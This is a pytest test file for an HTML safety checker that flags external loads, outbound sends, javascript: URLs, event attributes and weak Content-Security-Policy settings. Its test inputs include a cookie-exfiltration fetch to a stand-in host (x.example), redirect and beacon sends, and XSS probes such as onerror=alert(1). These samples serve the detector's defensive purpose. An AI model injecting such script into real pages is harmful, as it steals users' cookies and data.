import pytest
from check_html import (
    find_missing_required,
    find_problems,
    find_structure_problems,
    main,
)


def wrap(body: str) -> str:
    return f"<html><head></head><body>{body}</body></html>"


@pytest.mark.parametrize(
    "body",
    [
        '<script src="https://x.example/y.js"></script>',
        '<link rel="stylesheet" href="https://x.example/y.css">',
        '<img src="http://x.example/a.png">',
        "<style>@import url(https://x.example/y.css);</style>",
        "<style>body { background: url(http://x.example/a.png); }</style>",
        "<style>@import 'https://x.example/y.css';</style>",
        '<img srcset="https://x.example/a.png 1x, b.png 2x">',
        '<svg><image href="https://x.example/a.png"/></svg>',
        '<svg><image xlink:href="https://x.example/a.png"/></svg>',
        '<svg><use href="https://x.example/s.svg#a"/></svg>',
        '<object data="https://x.example/a.pdf"></object>',
        '<video poster="https://x.example/a.png"></video>',
        '<script src="//cdn.example/y.js"></script>',
        '<base href="https://x.example/">',
        '<img srcset="//x.example/a.png 1x">',
        '<img srcset="a.png 1x, //x.example/b.png 2x">',
        '<img srcset="a.png 1x,//x.example/b.png 2x">',
    ],
)
def test_external_load_is_reported(body):
    problems = find_problems(wrap(body))
    assert any("外部読み込み" in p for p in problems)


@pytest.mark.parametrize(
    "body",
    [
        '<svg xmlns="http://www.w3.org/2000/svg"></svg>',
        '<a href="https://example.com">リンク</a>',
        '<img src="data:image/png;base64,AAAA">',
        '<img srcset="data:image/png;base64,AA//AA 1x">',
        '<img srcset="data:image/png;base64,//8AAA 1x">',
        '<base href="#top">',
    ],
)
def test_allowed_references_are_not_reported(body):
    assert find_problems(wrap(body)) == []


@pytest.mark.parametrize(
    "body",
    [
        '<a ping="https://x.example/p">x</a>',
        '<button formaction="//x.example/p">x</button>',
        '<script>window.open("https://x.example/?d=" + d);</script>',
        "<script>new Image().src = base + d;</script>",
        '<script>new EventSource("https://x.example/e");</script>',
        '<script>location.href = "https://x.example/?" + d;</script>',
        '<script>document.location="//x.example";</script>',
        '<script>window.location.assign("//x.example");</script>',
        '<script>new Worker("https://x.example/w.js");</script>',
    ],
)
def test_other_external_sends_are_reported(body):
    problems = find_problems(wrap(body))
    assert any("外部への送信" in p for p in problems)


@pytest.mark.parametrize(
    "body",
    [
        '<a href="javascript:alert(1)">x</a>',
        "<a href='JavaScript:alert(1)'>x</a>",
        '<a href=" javascript:alert(1)">x</a>',
        "<a href=javascript:alert(1)>x</a>",
        '<iframe src="javascript:alert(1)"></iframe>',
        '<form action="javascript:alert(1)"></form>',
    ],
)
def test_javascript_url_is_reported(body):
    problems = find_problems(wrap(body))
    assert any("javascript:" in p for p in problems)


def test_javascript_as_text_is_not_reported():
    assert find_problems(wrap("<p>href に javascript: は使わない</p>")) == []


@pytest.mark.parametrize(
    "body",
    [
        '<script>fetch("https://x.example/?" + document.cookie)</script>',
        "<script>fetch ('/api')</script>",
        "<script>new XMLHttpRequest()</script>",
        '<script>new WebSocket("wss://x.example")</script>',
        '<script>navigator.sendBeacon("/log", "x")</script>',
        '<script>import("https://x.example/x.js")</script>',
        '<form action="https://x.example/"></form>',
        '<meta http-equiv="refresh" content="0;url=https://x.example/">',
    ],
)
def test_external_send_is_reported(body):
    problems = find_problems(wrap(body))
    assert any("外部への送信" in p for p in problems)


@pytest.mark.parametrize(
    "body",
    [
        "<img src=x onerror=alert(1)>",
        '<body onload="init()">',
        "<a href='#' onClick='go()'>x</a>",
    ],
)
def test_event_attribute_is_reported(body):
    problems = find_problems(wrap(body))
    assert any("イベント属性" in p for p in problems)


@pytest.mark.parametrize(
    "body",
    [
        "<p>データを fetch する処理は使わない</p>",
        "<p>once = 1 のとき</p>",
        '<button class="on">ON</button>',
        '<form action="#"></form>',
        '<script>const s = "import";</script>',
    ],
)
def test_similar_text_is_not_reported(body):
    assert find_problems(wrap(body)) == []


def test_clean_html_has_no_problems():
    assert find_problems(wrap("<p>本文</p>")) == []


CSP = (
    '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '
    "img-src data:; form-action 'none'; base-uri 'none'\">"
)


def test_structure_ok_when_doctype_charset_and_csp_exist():
    html = (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        f"{CSP}</head><body></body></html>"
    )
    assert find_structure_problems(html) == []


@pytest.mark.parametrize(
    "html",
    [
        f'<html><head><meta charset="utf-8">{CSP}</head><body></body></html>',
        f"<!DOCTYPE html><html><head>{CSP}</head><body></body></html>",
        '<!DOCTYPE html><html><head><meta charset="utf-8"></head><body></body></html>',
    ],
)
def test_structure_missing_part_is_reported(html):
    assert find_structure_problems(html) != []


@pytest.mark.parametrize(
    "policy",
    [
        "default-src *",
        "default-src 'self'",
        "img-src data:",
    ],
)
def test_loose_csp_is_reported(policy):
    html = (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        f'<meta http-equiv="Content-Security-Policy" content="{policy}">'
        "</head><body></body></html>"
    )
    problems = find_structure_problems(html)
    assert any("CSP" in p for p in problems)


def test_csp_without_form_action_and_base_uri_is_reported():
    html = (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'">'
        "</head><body></body></html>"
    )
    problems = find_structure_problems(html)
    assert any("form-action" in p for p in problems)
    assert any("base-uri" in p for p in problems)


def test_missing_required_text_is_reported():
    problems = find_missing_required("<p>売上の推移</p>", ["売上の推移", "件数の推移"])
    assert problems == ["必須の語が本文にない: 件数の推移"]


def test_required_text_inside_tags_is_not_counted():
    html = '<p class="件数の推移">本文</p><script>var a = "件数の推移";</script>'
    assert find_missing_required(html, ["件数の推移"]) != []


def test_required_text_found_across_inline_tags():
    assert find_missing_required("<h2>売上の<em>推移</em></h2>", ["売上の推移"]) == []


def test_main_reads_a_path_with_japanese_and_spaces(tmp_path):
    folder = tmp_path / "日本語 の フォルダ"
    folder.mkdir()
    page = folder / "2026-11-10 先月の売上.html"
    page.write_text(
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        f"{CSP}</head><body><p>売上の推移</p></body></html>",
        encoding="utf-8",
    )
    assert main(["check_html.py", str(page), "--require", "売上の推移"]) == 0
    assert main(["check_html.py", str(page), "--require", "件数の推移"]) == 1
